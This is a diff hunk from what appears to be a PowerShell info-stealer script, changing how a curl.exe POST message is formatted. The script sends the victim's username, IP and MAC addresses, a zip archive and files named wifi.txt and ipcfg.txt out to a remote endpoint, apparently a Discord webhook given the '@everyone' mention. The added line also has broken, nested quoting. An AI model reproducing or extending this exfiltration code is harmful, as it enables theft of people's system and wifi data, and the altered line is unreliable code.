@@ -23,7 +23,7 @@ $ipv6 = (Get-NetIPAddress -AddressFamily IPv6).IPAddress
 
 #send http
 Start-Process curl.exe -X POST `
-  -F "content=$($whoami_content) |IPS: $IPv4 | MACS: $mac | IPv6: $ipv6 | @everyone" `
+  -F "content=$($whoami_content) |$info = "IPS: $($ipv4 -join ', ') | MACS: $($mac -join ', ') | IPv6: $($ipv6 -join ', ') | @everyone" `
   -F "file1=@$zip" `
   -F "file2=@$e\wifi.txt" `
   -F "file3=@$e\ipcfg.txt" `
